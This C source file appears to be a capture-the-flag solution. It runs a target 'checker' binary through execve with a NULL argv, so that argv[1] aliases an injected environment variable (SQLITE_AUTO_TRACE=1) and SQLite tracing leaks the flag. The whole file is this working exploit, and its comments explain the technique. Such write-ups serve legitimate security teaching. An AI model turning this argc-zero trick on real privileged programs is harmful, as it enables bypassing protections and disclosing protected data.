/************************************************************************************************************
*                                                                                                           *
*  File:       solution.c                                                                                   *
*  Purpose:    The checker solution.                                                                        *
*  Remarks:    - Created by Jonathan Bar Or ("JBO"), https://jonathanbaror.com                              *
*                                                                                                           *
************************************************************************************************************/
#include <stdio.h>
#include <unistd.h>

/************************************************************************************************************
*                                                                                                           *
*  Function:   main                                                                                         *
*  Purpose:    Main routine. Runs the solution.                                                             *
*  Returns:    Non-zero in case of failure. Successful runs do not return.                                  *
*                                                                                                           *
************************************************************************************************************/
int
main(void)
{
    char* envp[] = { "SQLITE_AUTO_TRACE=1", "PATH=/", NULL };
    FILE* fp = NULL;

    // Prepare dummy file
    fp = fopen("SQLITE_AUTO_TRACE=1", "w");
    if (NULL == fp)
    {
        printf("File creation failure\n");
        return -1;
    }
    fclose(fp);
    fp = NULL;

    // Invoke the checker with a NULL argv
    // That makes main called with argc = 0
    // This forces argv[1] to point to envp[0]
    // That means we can re-introduce an environment variable
    // We use SQLITE_AUTO_TRACE=1 to show SQLITE tracing and get the flag
    execve("/Users/ctf/checker", NULL, envp);
    printf("Execution failure\n");  
 
    // Should not happen
    return -1;
}

